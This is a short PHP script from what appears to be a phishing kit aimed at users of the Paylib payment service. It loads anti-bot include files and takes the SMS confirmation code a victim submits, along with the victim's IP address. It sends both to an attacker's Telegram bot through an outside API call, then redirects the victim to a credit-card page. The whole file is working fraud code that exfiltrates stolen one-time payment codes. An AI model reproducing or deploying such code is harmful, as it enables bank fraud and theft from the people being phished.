<?php

session_start();

include '../anti/anti1.php';
include '../anti/anti15.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
	

$ip = getenv("REMOTE_ADDR");


$message = "[+]━━━━【🔥 PAYLIB CODE' 🔥】━━━━[+]\r\n";
$message .= "[+] CODE   : " .$_POST['smsRef']."\r\n";
$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "[+] IP : " .$ip."\n";
$message .= "[+]━━━━【🔥 PAYLIB 🔥】━━━━[+]\n";



file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

HEADER("Location: ../cc.html");


?>

